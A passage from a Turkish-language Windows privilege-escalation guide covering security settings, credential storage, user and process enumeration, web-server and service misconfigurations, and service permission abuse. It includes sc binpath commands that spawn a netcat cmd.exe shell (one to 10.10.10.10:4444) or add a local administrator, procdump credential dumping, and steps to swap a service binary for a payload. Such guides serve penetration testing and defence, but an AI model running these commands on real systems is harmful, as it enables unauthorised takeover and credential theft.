msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Bu güvenlik açığından yararlanmak için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirüs ve Tespit Araçları

### Denetim Ayarları

Bu ayarlar nelerin **günlüğe kaydedileceğini** belirler, bu yüzden dikkat etmelisiniz

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding'de logların nereye gönderildiğini bilmek ilginçtir.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS**, etki alanına katılmış bilgisayarlarda her parolanın **benzersiz, rastgele ve düzenli olarak güncellenmiş** olmasını sağlayarak **yerel Administrator parolalarının yönetimi** için tasarlanmıştır. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izin verilmiş kullanıcılar tarafından görüntülenebilir; bu sayede yetkili kullanıcılar yerel admin parolalarını görebilir.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse, **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) içinde saklanır.\
[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** ile birlikte Microsoft, sistemi daha da güvenli hale getirmek için güvenilmeyen işlemlerin **Local Security Authority (LSA)** belleğini **okuma** veya buraya kod enjekte etme girişimlerini **engellemek** üzere gelişmiş koruma özelliğini kullanıma sundu.\
[**LSA Protection hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credential Guard

**Credential Guard**, **Windows 10**'da kullanıma sunulmuştur. Amacı, bir cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır. [**Credential Guard hakkında daha fazla bilgiye buradan ulaşabilirsiniz.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Önbelleğe Alınmış Kimlik Bilgileri

**Etki alanı kimlik bilgileri**, **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için genellikle etki alanı kimlik bilgileri oluşturulur.\
[**Önbelleğe Alınmış Kimlik Bilgileri hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listeleme

Üyesi olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Ayrıcalıklı gruplar

**Ayrıcalıklı bir gruba üyeyseniz ayrıcalıklarınızı yükseltebilirsiniz**. Ayrıcalıklı gruplar ve ayrıcalıklarınızı yükseltmek için bunları nasıl kötüye kullanacağınız hakkında buradan bilgi edinin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

Bu sayfada **token** hakkında daha fazla bilgi edinin: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
**İlginç tokenlar** ve bunları nasıl kötüye kullanacağınız hakkında bilgi edinmek için şu sayfaya göz atın:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Oturumlar

```bash
qwinsta
klist sessions
```

### Kullanıcı ana klasörleri

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Parola Politikası

```bash
net accounts
```

### Panonun içeriğini alın

```bash
powershell -command "Get-Clipboard"
```

## Çalışan İşlemler

### Dosya ve Klasör İzinleri

Öncelikle, işlemleri listelerken **işlemin komut satırında parola olup olmadığını kontrol edin**.\
Çalışan bir **binary'nin üzerine yazıp yazamayacağınızı** veya olası [**DLL Hijacking saldırılarından**](dll-hijacking/index.html) yararlanmak için binary klasöründe yazma izniniz olup olmadığını kontrol edin:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Her zaman çalışan [**electron/cef/chromium debuggers** olup olmadığını kontrol edin; bunları yetki yükseltmek için kötüye kullanabilirsiniz](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Bir debugger listener kısa süreliğine çalışıyor olabilir; bu nedenle tek bir pasif port anlık görüntüsünde görünmemesi, hiçbir zaman dışarıya açık olmadığını kanıtlamaz. Gözlemlenen listener'ları PID, süreç sahibi ve düşük ayrıcalıklı kullanıcının bu listener'lara erişebilme olanağıyla ilişkilendirin; yalnızca uygulama adı veya debug flag'i, kullanıcılar arası code execution olduğunu kanıtlamaz. Rutin numaralandırmayı pasif tutun; debugger komutları göndermeyin.

**Süreçlerin binary dosyalarının izinlerini kontrol etme**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Süreç ikililerinin bulunduğu klasörlerin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor dizinleri

Snort 2, `snort.exe -c <config>` ile seçilen yapılandırmada belirtilen `dynamicpreprocessor directory` içinden paylaşımlı kütüphaneler yükleyebilir. Snort'u farklı bir hesapla çalıştıran zamanlanmış görev veya hizmet için bu yapılandırmayı ve belirtilen modül dizininin ACL'sini inceleyin. Token'ınız bu dizinde dosya oluşturabiliyorsa, görev veya hizmet modülleri bir sonraki yüklediğinde bu yol kod yürütme açısından incelenmeye adaydır. Bu ayrıcalık yükseltme anlamına gelmez; çalıştırma hesabının etkin ayrıcalıklarını, etkin yapılandırmayı, modül uyumluluğunu ve olası deny veya paylaşım kısıtlamalarını doğrulayın. [Snort'un dynamic-preprocessor belgeleri](https://www.snort.org/documents/dpx-readme) çalışma zamanı modül yüklemeyi açıklar.

### Yazılabilir document root dizinine sahip ayrıcalıklı web hizmeti

Windows Apache kurulumunda hizmetin yürütülebilir dosya yolunu ve çalıştırma hesabını, etkin `httpd.conf` dosyasındaki `DocumentRoot` ile karşılaştırın. Standart bir XAMPP düzeninde `C:\xampp\apache\conf\httpd.conf` dosyasını ve yapılandırılmış document root dizininin ACL'sini (genellikle `C:\xampp\htdocs`) inceleyin. Apache `LocalSystem` olarak çalışırken düşük ayrıcalıklı bir kullanıcı bu dizinde dosya oluşturabiliyorsa, server-side code execution ana makinenin ayrıcalık sınırını aşabilir. Hizmetin çalıştığını, tam olarak bu yolun sunulduğunu ve server-side bir işleyicinin ilgili dosya türünü işlediğini doğrulayın; tek başına yazılabilir bir root yalnızca dosya oluşturulabildiğini gösterir. Bir test dosyası yazmadan ACL'leri inceleyin:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Geleneksel bir WAMP kurulumunda hizmet, sürümlü bir `C:\wamp64\bin\apache\apache*\bin\httpd.exe` dosyasını (32-bit düzen için `C:\wamp\...`) gösterebilir; yapılandırma dosyası yanındaki `conf\httpd.conf` dizininde, varsayılan kök dizin ise `C:\wamp64\www` veya `C:\wamp\www` olabilir. Hizmetin tam image değerini, çalıştırma kimliğini, etkin `DocumentRoot` değerini (`${INSTALL_DIR}` genişletmesi ve sanal ana makine geçersiz kılmaları dahil) ve kök ACL'sini birlikte kontrol edin. Yazılabilir bir WAMP dizini, Apache'nin `SYSTEM` olarak çalıştığını veya gönderilen dosyayı çalıştırdığını kanıtlamaz. [Apache, bir Windows hizmetinin yapılandırmasını nasıl seçtiğini belgeliyor](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Yazılabilir IIS kök dizini ve uygulama havuzunun ağ kimliği

IIS için, `applicationHost.config` içindeki yazılabilir fiziksel dizini **etkin bir site/uygulamayla** eşleştirin; ardından yapılandırılmış havuzu ve sunucu tarafı handler'ı belirleyin. Sunulan bir dizine yerleştirilen kod, ancak IIS bu dosya türünü işliyorsa ve rotaya erişilebiliyorsa havuz kimliğiyle çalışır. Yazılabilir bir dizini kod yürütme olarak değerlendirmeden önce geçerli kullanıcının etkin dosya oluşturma erişimini, sitenin çalışma durumunu, handler'ı ve yola özel geçersiz kılmaları kontrol edin.

ASP.NET dinamik derlemesi, incelenmesi gereken ayrı bir yol oluşturur: uygulamanın derleme dizini altındaki oluşturulan dosyalar. Varsayılan konum, ilgili .NET Framework kurulumunun altındaki `Temporary ASP.NET Files` dizinidir; ancak uygulamanın `<compilation tempDirectory>` ayarı bunu değiştirebilir. [Microsoft, konumu ve uygulama başına alt dizinleri belgeliyor](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) ve [uygulama havuzları birbirine güvenmediğinde derleme dizinlerinin yalıtılmasını öneriyor](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Daha düşük ayrıcalıklı bir token, **belirli** uygulamanın önbelleğindeki oluşturulan kaynak kodu değiştirebiliyorsa, uygulamanın bu kodu daha ayrıcalıklı bir [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) altında yeniden derleyip derlemediğini belirleyin. Tek başına bir dosya veya dizin ACL'si kod yürütüldüğünü kanıtlamaz: önbelleği etkin uygulama, etkin token ve ACL, derleme ayarları, işlem kimliği ve olası yeniden derleme zamanlamasıyla ilişkilendirin. Salt okunur metadata incelemesi yapın; envanter çıkarırken derlemeyi tetiklemeyin veya önbellek dosyalarını değiştirmeyin.

`ApplicationPoolIdentity` veya `NetworkService` olarak yapılandırılmış bir IIS havuzu, yerel token'ı düşük ayrıcalıklı olsa bile, genellikle etki alanı kaynaklarında **ana bilgisayar bilgisayar hesabı** olarak kimlik doğrular. `LocalSystem` zaten yerel olarak yüksek ayrıcalıklıdır ve ağda da bilgisayar hesabını kullanır; `LocalService` ise normalde anonim ağ kimlik bilgileri sunar. `SpecificUser` havuzu, bunun yerine yapılandırılmış hesabı kullanır. [Microsoft bu kimlik türlerini belgeliyor](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) ve [uygulama havuzunun ağ kimliğini açıklıyor](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Kimlik ayarı belirtilmemişse havuz varsayılanlarını devralabilir; bunlar IIS sürümleri arasında farklılık gösterdiğinden, havuz adına bakarak tahmin yürütmek yerine etkin yapılandırmayı çözümleyin. Kod yürütme bilgisayar hesabı ağ kimliğine sahip bir havuza ulaşıyorsa, **ilgili bilgisayarın** dizin haklarını değerlendirin. [DCSync](../active-directory-methodology/dcsync.md), etki alanı adlandırma bağlamında çoğaltma hakları gerektirir; tek başına bir makine hesabı bileti veya ana bilgisayar rolü bu hakları kanıtlamaz. Pasif envanter, dosya yüklemeden, ağ kimlik doğrulaması yapmadan veya bilet istemeden yapılandırmaları ve ACL'leri incelemelidir.

Yardımcı bir işlemi başlatan, okunabilir bir ASP.NET handler için istekten türetilen değerleri kimlik doğrulama, şifre çözme, doğrulama ve komut oluşturma aşamalarında izleyin. Çözümlenmiş bir token'ı `ProcessStartInfo("cmd", "/c ...")` içine birleştiren handler, kabuk meta karakterlerinin komutu değiştirmesine izin verebilir; [Microsoft, `cmd` özel karakterlerini belgeliyor](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Güvenilmeyen bir çağıranın çözümlenmiş değeri gerçekten etkileyebildiğini ve handler'a erişebildiğini belirleyin; ardından etkin uygulama havuzu veya impersonation kimliğini ve alt işlemin kimliğini çözümleyin. Okunabilir bir kaynak kod satırı, localhost dinleyicisi veya token biçimindeki bir zayıflık tek başına ayrıcalıklı komut yürütüldüğünü kanıtlamaz. Pasif envanter sırasında sahte istekler göndermeden veya yardımcı programı çalıştırmadan kaynak kodu ve havuz yapılandırmasını inceleyin.

Windows'taki bir PHP hizmetinde, [`include` veya `require`](https://www.php.net/manual/en/function.include.php) yönergesine aktarılan, istek tarafından denetlenen bir yol; düşük kullanıcının yazabildiği bir PHP dosyasını worker kimliğiyle değerlendirebilir. İsteğin bu ifadeye ulaşabildiğini, çözümlenen yolun düşük kullanıcının değiştirebildiği ve worker'ın okuyabildiği bir dosyayı gösterdiğini, geçerli PHP yol kısıtlamalarının include işlemine izin verdiğini ve worker'ın gerçekten daha yüksek ayrıcalıklarla çalıştığını doğrulayın. Döngüsel bir dinleyici veya yazılabilir bir dosya tek başına bu zinciri kanıtlamaz; pasif envanter sırasında endpoint'i çağırmadan kaynak kodu, hizmet kimliğini ve dosya ACL'lerini inceleyin.

### Bellekten parola madenciliği

Sysinternals'ın **procdump** aracını kullanarak çalışan bir işlemin bellek dökümünü oluşturabilirsiniz. FTP gibi hizmetler **kimlik bilgilerini bellekte açık metin olarak** tutar; belleği döküp kimlik bilgilerini okumayı deneyin.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Güvensiz GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar, bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın, "Click to open Command Prompt" seçeneğine tıklayın

### Ayrıcalıklı proje dosyası içe aktarma

Daha düşük yetkili bir kullanıcının yazabildiği bir bırakma dizinindeki projeleri otomatik olarak açan bir uygulama, içe aktarıcının hesabı altında bir girdi güven sınırını aşar. **Tam yazılabilir yolu**, bu yolu açan işlemi veya görevi, etkin kimliğini ve ayrıştırıcı derlemesini inceleyin. [Geçmişteki bir Ghidra proje açma/geri yükleme sorunu](https://github.com/NationalSecurityAgency/ghidra/issues/71), proje meta verilerinde harici XML varlıklarına izin veriyordu; Windows'taki bir ağ varlığı, [giden SMB ve NTLM ilkeleri](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) izin veriyorsa içe aktarma hesabından kimlik doğrulaması yapılmasına neden olabilirdi. Bu, kimlik bilgilerinin açığa çıkabileceğine dair bir bulgudur; doğrudan yönetici erişimi sağlamaz: yanıtın ayrı bir yetkili veya savunmasız yol üzerinden kullanılabilmesi ve mevcut derlemelerin gerçek yama durumlarına göre değerlendirilmesi gerekir. Pasif sayım sırasında hazırlanmış bir projeyi açmayın; içe aktarma iş akışını ve ACL'leri inceleyin.

## Hizmetler

Service Control Manager (SCM) nesnesinin [`SC_MANAGER_CREATE_SERVICE` hakkı](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), mevcut bir hizmet üzerindeki haklardan ayrıdır. Bu hak için başarılı, salt okunur bir [`OpenSCManager` erişim isteği](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw), yeni bir hizmetin çalıştırılabileceğinin kanıtı değil, incelenmesi gereken bir bulgudur. [`CreateService` bir tanıtıcı döndürür](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew); bu tanıtıcı, oluşturma sırasında istenen hizmet erişimine sahiptir. Hizmeti daha sonra yeniden açmak ayrı bir erişim denetimi gerçekleştirir ve özgün tanıtıcı kullanılabilir olsa bile başarısız olabilir. Etkin yerel veya uzak belirteci, verilen tanıtıcı haklarını, hizmet hesabını, başlatma ilkesini ve yürütülebilir dosya yolunu ayrı ayrı doğrulayın. Pasif sayım sırasında hizmet oluşturmayın veya başlatmayın.

Uzak hizmet yükleme yolu için SCM haklarını, hedefte **aynı ağ oturum açma bilgileriyle** yazılabilen bir paylaşımla, bu paylaşımın temelindeki NTFS ACL'leriyle ve hizmet hesabının çalıştırabileceği yerel bir yürütülebilir dosya yoluyla birlikte değerlendirin. Alışılmadık derecede geniş SCM hakları ve dosya yerleştirme yolu birlikte mevcutsa yönetici olmayan bir hesap bu sınırı aşabilir; yönetim paylaşımı zorunlu değildir. Tek başına paylaşımda yazma erişimi veya SCM'de hizmet oluşturma bulgusu, yeni hizmetin daha yüksek bir kimlikle başlatılabileceğini kanıtlamaz.

Mevcut bir hizmet, yardımcı dosya `ImagePath` içinde olmasa bile başlangıçta, kapanırken veya başka bir yaşam döngüsü olayında yardımcı bir yürütülebilir dosyayı çağırabilir. Yardımcı dosya adı, daha düşük yetkili bir kullanıcının yazabildiği bir dizine çözümleniyorsa ve hizmet daha yüksek bir kimlikle çalışıyorsa, eksik yardımcı dosya koşullu bir değiştirme adayıdır. **Hizmetin gerçek kodunu veya belgelenmiş yardımcı çağrısını**, çözümlenen yürütülebilir dosya yolunu ve arama sırasını, dizin oluşturma haklarını, hizmet kimliğini ve kullanılabilir bir yaşam döngüsü tetikleyicisini doğrulayın. Yazılabilir bir hizmet dizini veya eksik bir dosya tek başına hizmetin bu dosyayı yüklediğini kanıtlamaz; pasif inceleme sırasında hizmeti başlatmayın veya durdurmayın.

Mevcut bir hizmette [`SERVICE_START`, `StartService` için bağımsız değişken sağlanmasına izin verir](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); bu hak, [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) hakkından farklıdır. Başlatma erişimini yalnızca bir denetim hakkı olarak değerlendirmeden önce hizmetin kodunu veya belgelenmiş arayüzünü inceleyin. Hizmet, çağıranın seçtiği bir bağımsız değişkeni günlük ya da dışa aktarma yolu olarak kullanıyorsa hizmet kimliğini, bağımsız değişkenden yazma işlemine giden kesin akışı, yol kısıtlamalarını ve **oluşturulan dosyanın** izinlerini doğrulayın. Korumalı bir dizine yazma işlemi ancak bu dosyayı kabul eden ayrı bir ayrıcalıklı tüketici veya yükleyici varsa yükseltmeye yol açabilir; tek başına yazılabilir bir günlük dosyası veya başlatma hakkı yeterli değildir. Pasif envanter sırasında hizmeti başlatmayın veya test dosyası oluşturmayın.

NSClient++ izleme aracısı için okunabilir bir `nsclient.ini`, bir **yapılandırma inceleme bulgusudur**: web kimlik bilgilerini içerebilir; `boot.ini` ise yapılandırmayı başka bir konuma yönlendirebilir. Gerçek hizmet hesabını, WEB dinleyicisini ve erişim ilkesini, ayrıca kimliği doğrulanmış rolün ayarları veya betikleri değiştirip değiştiremediğini kontrol edin. Ayrıcalıklı yürütme için ayrıca `CheckExternalScripts` (veya etkin başka bir yürütme yolu), bir komutu kaydetme ya da değiştirme konusunda etkin bir hak ve komutu hizmet kimliği altında çalıştıran bir tetikleyici gerekir. Yalnızca loopback adresini dinleyen bir dinleyiciye yerel kullanıcı yine de erişebilir; ancak dosya yolu, parola veya dinleyici tek başına bu hakların varlığını kanıtlamaz. Pasif sayım sırasında gizli bilgileri görüntülemeden veya web API'sini çağırmadan meta verileri ve izinleri inceleyin. [NSClient++ dosya düzenine](https://nsclient.org/docs/concepts/file-layout/), [web ve betik güvenliği kılavuzuna](https://nsclient.org/docs/setup/securing/) ve [harici betik yapılandırmasına](https://nsclient.org/docs/reference/check/CheckExternalScripts/) bakın.

`ImagePath` değeri `nssm.exe` olan bir hizmet için hizmetin gerçek çalıştırma hesabını ve `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` değerini inceleyin: [NSSM alt uygulamayı burada saklar](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), `AppDirectory` ise yapılandırılmış çalışma dizinidir. Sarmalayıcının izinlerini hizmet sınırının tamamı olarak değerlendirmeden önce alt yürütülebilir dosyayı ve üst dizinlerinin ACL'lerini kontrol edin. Bu alt uygulamanın sunduğu yerel bir WCF veya SOAP uç noktası ayrı bir inceleme bulgusudur: düşük yetkili kullanıcının dinleyiciye erişebildiğini, ilgili işlemin bu kullanıcının girdisini kabul ettiğini ve hizmet alt uygulamasının güvenli olmayan işlemi daha yüksek bir kimlikle gerçekleştirdiğini doğrulayın. Hizmet hesabı, uç nokta URL'si veya yazılabilir bir yol tek başına yükseltmeyi kanıtlamaz; pasif sayım sırasında hizmet işlemlerini çağırmaktan kaçının.

Özel bir WCF işlemi için çağıranın denetleyebildiği bir dizenin PowerShell runspace'ine aktarılıp aktarılmadığını izleyin. [`Pipeline.Commands.AddScript`, betik metni ekler](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript) ve [`Pipeline.Invoke`, işlem hattını çalıştırır](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [Windows aktarım kimlik bilgileri kullanan bir `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) istemcinin kimliğini doğrular; ancak **belirli** işlemi çağırma yetkisi ve runspace'in etkin kimliği ayrıca denetlenmelidir. Düşük yetkili bir çağıranın girdisinden daha yüksek hizmet kimliği altında çalışan `AddScript`'e uzanan bir yol, kod yürütme sınırıdır; dinleme yapan bir bağlantı noktası, kimliği doğrulanmış istemci veya ilgisiz bir derlemedeki kullanılmayan yöntem tek başına kanıt değildir. Sayım sırasında uç noktayı çağırmadan dağıtılmış hizmeti, sözleşmeyi, yetkilendirmeyi ve kimliğe bürünme ayarlarını statik olarak inceleyin.

Service Triggers, belirli koşullar oluştuğunda (adlandırılmış kanal/RPC uç noktası etkinliği, ETW olayları, IP kullanılabilirliği, aygıt bağlanması, GPO yenilemesi vb.) Windows'un bir hizmeti başlatmasını sağlar. SERVICE_START hakları olmasa bile tetikleyicileri etkinleştirerek ayrıcalıklı hizmetleri çoğu zaman başlatabilirsiniz. Sayım ve etkinleştirme tekniklerini burada görebilirsiniz:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio tanılama toplayıcı hizmeti

C/C++ araçlarını içeren Visual Studio kurulumlarında `LocalSystem` olarak çalışacak şekilde yapılandırılmış `VSStandardCollectorService150` tanılama hizmeti bulunabilir. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/), hizmet DACL sıfırlamasını yönlendirmek için bir junction ve object-manager-link yarış durumu kullandı. Gösterilen yükseltme için ayrıca kullanılabilir bir Visual Studio Setup WMI Provider MSI onarım yolu ve `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` hedefi gerekiyordu. Bileşendeki güvenlik açığı Ocak 2024'te düzeltildi.

Pasif ön inceleme için yalnızca bu hizmetin hesabını ve ikili dosya yolunu inceleyin, Setup WMI derleyici yolunun mevcut olup olmadığını kontrol edin ve yüklü bileşenin yama durumunu doğrulayın. Hizmet girdisi, Visual Studio ürün sürümü veya derleyici dosyası tek başına ana bilgisayarın savunmasız olduğunu kanıtlamaz. İnceleme için hizmeti başlatmak veya onarım çalıştırmak gerekmez.

Hizmetlerin listesini alın:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### İzinler

Bir hizmet hakkında bilgi almak için **sc** kullanabilirsiniz.

```bash
sc qc <service_name>
```

Her hizmet için gereken ayrıcalık düzeyini kontrol etmek üzere _Sysinternals_'tan **accesschk** ikili dosyasını bulundurmanız önerilir.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

"Authenticated Users" grubunun herhangi bir hizmeti değiştirme yetkisi olup olmadığını kontrol etmeniz önerilir:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Hizmeti etkinleştirme

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_Sistem hatası 1058 oluştu._\
_Hizmet başlatılamıyor; çünkü devre dışı bırakılmış veya etkinleştirilmiş hiçbir aygıtla ilişkilendirilmemiş._

Şunu kullanarak etkinleştirebilirsiniz:

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**XP SP1 için upnphost hizmetinin çalışmasının SSDPSRV'ye bağlı olduğunu göz önünde bulundurun**

**Bu soruna yönelik başka bir geçici çözüm** şunu çalıştırmaktır:

```
sc.exe config usosvc start= auto
```

### **Servis ikili dosya yolunu değiştirme**

"Authenticated users" grubunun bir servis üzerinde **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, servisin çalıştırılabilir ikili dosyasını değiştirmek mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Hizmeti yeniden başlat

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Ayrıcalıklar çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Hizmet binary’sinin yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar ve hizmet yapılandırmalarını değiştirme olanağı sunar.
- **WRITE_OWNER**: Sahipliğin alınmasına ve izinlerin yeniden yapılandırılmasına olanak tanır.
- **GENERIC_WRITE**: Hizmet yapılandırmalarını değiştirme yeteneğini devralır.
- **GENERIC_ALL**: Hizmet yapılandırmalarını değiştirme yeteneğini de devralır.

Bu güvenlik açığının tespiti ve istismarı için _exploit/windows/local/service_permissions_ kullanılabilir.

### Hizmet binary’lerinde zayıf izinler

Bir hizmet **`LocalSystem`**, **`LocalService`**, **`NetworkService`** veya ayrıcalıklı bir domain hesabı olarak çalışıyorsa, ancak **düşük ayrıcalıklı kullanıcılar hizmetin EXE dosyasını veya üst klasörünü değiştirebiliyorsa**, hizmet genellikle **binary değiştirilip hizmet yeniden başlatılarak** ele geçirilebilir.

**Bir hizmet tarafından çalıştırılan binary’yi değiştirip değiştiremeyeceğinizi** veya binary’nin bulunduğu **klasörde yazma izinleriniz olup olmadığını** kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html)**.**\
Bir hizmet tarafından çalıştırılan tüm binary’leri **wmic** (system32 içinde değil) kullanarak bulabilir ve izinlerinizi **icacls** kullanarak kontrol edebilirsiniz:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Ayrıca **sc** ve **icacls** de kullanabilirsiniz:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**, **`BUILTIN\Users`** veya **`Authenticated Users`** için verilmiş tehlikeli ACL’leri, özellikle hizmet executable’ında veya onu içeren dizinde **`(F)`**, **`(M)`** ya da **`(W)`** izinlerini arayın. Uygulanabilir bir kötüye kullanım akışı şöyledir:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` ile hizmet hesabını ve executable yolunu doğrulayın.
2. `icacls <path>` ile binary’nin yazılabilir olduğunu doğrulayın.
3. Hizmet binary’sini bir payload veya geçerli, kötü amaçlı bir hizmet binary’siyle değiştirin.
4. `sc stop <service_name> && sc start <service_name>` ile hizmeti yeniden başlatın (ya da yeniden başlatmayı / hizmet tetikleyicisini bekleyin).

Yararlı otomatik kontroller:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
